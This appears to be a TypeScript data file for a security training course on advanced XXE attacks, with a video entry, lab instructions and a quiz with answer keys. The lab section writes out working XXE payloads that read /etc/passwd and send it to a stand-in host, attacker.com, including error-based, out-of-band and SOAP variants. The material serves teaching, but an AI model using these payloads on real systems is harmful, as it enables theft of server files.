import { CourseModule } from '../../../types/course';

export const xxeLevel2Modules: CourseModule[] = [
  {
    id: 'xxe-level2-intro',
    title: 'Level 2: Advanced XXE Techniques',
    duration: '2h',
    type: 'video',
    status: 'available',
    description: 'Master advanced XXE exploitation techniques and bypass methods.',
    videoUrl: 'https://example.com/videos/advanced-xxe',
  },
  {
    id: 'xxe-level2-lab',
    title: 'Advanced XXE Lab',
    duration: '3h',
    type: 'lab',
    status: 'available',
    description: 'Practice advanced XXE techniques and filter bypass methods.',
    labInstructions: `
Advanced XXE Laboratory

1. Advanced Techniques:
   - Parameter entities
   - Error-based XXE
   - Out-of-band XXE
   - XXE through SOAP

2. Advanced Payloads:
   \`\`\`xml
   <!-- Error-based XXE -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
     %eval;
     %error;
   ]>
   <root>test</root>

   <!-- Out-of-band XXE -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [ <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>
   <root>&send;</root>

   <!-- evil.dtd content -->
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
   %all;
   \`\`\`

3. SOAP XXE:
   \`\`\`xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [
     <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
     %dtd;
   ]>
   <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
       <test>&exfil;</test>
     </soap:Body>
   </soap:Envelope>
   \`\`\`

4. Advanced Testing:
   - Blind XXE detection
   - Network protocol abuse
   - Filter bypass techniques
   - Custom entity expansion
    `,
  },
  {
    id: 'xxe-level2-quiz',
    title: 'Advanced XXE Assessment',
    duration: '1h',
    type: 'quiz',
    status: 'available',
    description: 'Test your knowledge of advanced XXE techniques.',
    questions: [
      {
        question: 'What is the purpose of parameter entities in XXE?',
        options: [
          'To enable nested entity declarations',
          'To format XML output',
          'To validate XML structure',
          'To compress XML data',
        ],
        correctAnswer: 0,
      },
      {
        question: 'Which technique is used for blind XXE data exfiltration?',
        options: [
          'Out-of-band callbacks',
          'Error messages',
          'Direct output',
          'XML comments',
        ],
        correctAnswer: 0,
      },
      {
        question: 'What makes SOAP services vulnerable to XXE?',
        options: [
          'XML processing of SOAP messages',
          'SOAP authentication',
          'SOAP encryption',
          'SOAP headers',
        ],
        correctAnswer: 0,
      },
    ],
  },
];